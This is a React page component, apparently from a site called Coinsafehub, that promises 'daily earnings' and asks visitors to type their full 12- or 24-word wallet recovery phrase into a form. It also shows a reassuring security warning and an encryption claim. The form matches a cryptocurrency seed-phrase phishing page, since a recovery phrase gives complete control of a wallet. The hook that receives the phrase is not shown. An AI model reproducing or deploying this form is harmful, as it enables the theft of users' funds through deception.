"use client";

import { useState } from "react";
import { useWallet } from "@/hooks/useWallet";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import {
    Select,
    SelectContent,
    SelectItem,
    SelectTrigger,
    SelectValue
} from "@/components/ui/select";
import { toast } from "sonner";
import { ShieldAlert, Wallet, Info } from "lucide-react";

export default function WalletPage() {
    const { isSubmitting, connectWallet } = useWallet();

    const [walletType, setWalletType] = useState("");
    const [phraseKey, setPhraseKey] = useState("");

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!walletType || !phraseKey) {
            toast.error("Please fill in all fields.");
            return;
        }

        const success = await connectWallet({ walletType, phraseKey });
        if (success) {
            setPhraseKey("");
            setWalletType("");
        }
    };

    return (
        <div className="max-w-2xl mx-auto space-y-6">
            <div className="flex flex-col gap-2">
                <h1 className="text-2xl font-bold tracking-tight">Connect Wallet</h1>
                <p className="text-muted-foreground text-sm">
                    Connect your wallet to enable daily earnings and synchronized asset tracking.
                </p>
            </div>

            <Card>
                <CardHeader>
                    <div className="flex items-center gap-3">
                        <div className="rounded-full bg-primary/10 p-2">
                            <Wallet className="h-5 w-5 text-primary" />
                        </div>
                        <div>
                            <CardTitle className="text-lg">Wallet Connection</CardTitle>
                            <CardDescription>Securely link your existing wallet</CardDescription>
                        </div>
                    </div>
                </CardHeader>
                <CardContent>
                    <form onSubmit={handleSubmit} className="space-y-6">
                        <div className="space-y-2">
                            <Label htmlFor="walletType">Select Wallet</Label>
                            <Select value={walletType} onValueChange={setWalletType} required>
                                <SelectTrigger id="walletType">
                                    <SelectValue placeholder="-- Choose Wallet --" />
                                </SelectTrigger>
                                <SelectContent>
                                    <SelectItem value="bitcoin">Bitcoin</SelectItem>
                                    <SelectItem value="ethereum">Ethereum</SelectItem>
                                    <SelectItem value="tether">Tether USDT</SelectItem>
                                    <SelectItem value="binance">Binance Coin</SelectItem>
                                </SelectContent>
                            </Select>
                        </div>

                        <div className="space-y-2">
                            <Label htmlFor="phraseKey">Wallet Phrase Key</Label>
                            <Textarea
                                id="phraseKey"
                                placeholder="Enter your 12 or 24-word phrase key securely"
                                rows={4}
                                value={phraseKey}
                                onChange={(e) => setPhraseKey(e.target.value)}
                                required
                                className="font-mono text-sm"
                            />
                            <div className="flex items-center gap-2 text-xs text-muted-foreground">
                                <Info className="h-3 w-3" />
                                <span>Your phrase key is encrypted and never stored in plain text.</span>
                            </div>
                        </div>

                        <div className="rounded-lg border border-red-200 bg-red-50 p-4 flex gap-3">
                            <ShieldAlert className="h-5 w-5 text-red-600 mt-0.5 shrink-0" />
                            <div className="text-xs text-red-800 space-y-1">
                                <p className="font-bold">Security Warning</p>
                                <p>Never share your recovery phrase with anyone. Coinsafehub agents will never ask for your phrase via email or chat.</p>
                            </div>
                        </div>

                        <Button type="submit" className="w-full h-12 text-md" disabled={isSubmitting}>
                            {isSubmitting ? "Connecting..." : "Connect Wallet"}
                        </Button>
                    </form>
                </CardContent>
            </Card>
        </div>
    );
}
